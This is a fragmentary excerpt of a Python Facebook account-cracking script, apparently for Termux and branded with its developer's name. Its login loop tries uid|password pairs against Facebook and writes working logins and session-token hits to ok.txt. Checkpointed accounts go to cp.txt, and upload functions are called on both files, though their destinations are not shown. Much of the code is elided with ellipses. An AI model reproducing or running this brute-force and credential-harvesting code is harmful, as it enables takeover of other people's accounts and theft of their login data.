...
def notice():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/NIROBSHEIKH112200"])
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            NIROB SHEIKH 
...
#				exit()
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[NIROB-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [NIROB-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[NIROB-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [NIROB-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
